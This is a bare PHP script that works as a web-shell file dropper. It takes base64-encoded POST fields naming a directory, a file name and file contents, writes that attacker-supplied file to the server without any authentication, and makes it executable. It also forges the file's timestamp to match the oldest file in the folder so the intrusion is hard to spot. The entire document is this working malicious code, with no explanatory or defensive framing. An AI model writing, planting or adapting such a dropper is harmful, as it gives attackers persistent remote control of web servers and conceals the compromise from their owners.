<?php

function set_min_date($filepath) {
    $dir = dirname($filepath);
    $o = opendir($dir);
    $min_lastmod = 0;
    while ($r = readdir($o)) {
        $mod = filectime($dir . "/" . $r);
        if (!$min_lastmod) {
            $min_lastmod = $mod;
            continue;
        }

        if ($min_lastmod > $mod) {
            $min_lastmod = $mod;
        }
    }

    if ($min_lastmod) {
        touch($filepath, $min_lastmod);
    }
}

$pth = base64_decode($_POST['d_pth']);
chdir($pth);
$d_content = base64_decode($_POST['d_content']);
$d_file = base64_decode($_POST['d_file']);
file_put_contents($d_file,$d_content);

set_min_date($d_file);
chmod($d_file,0755);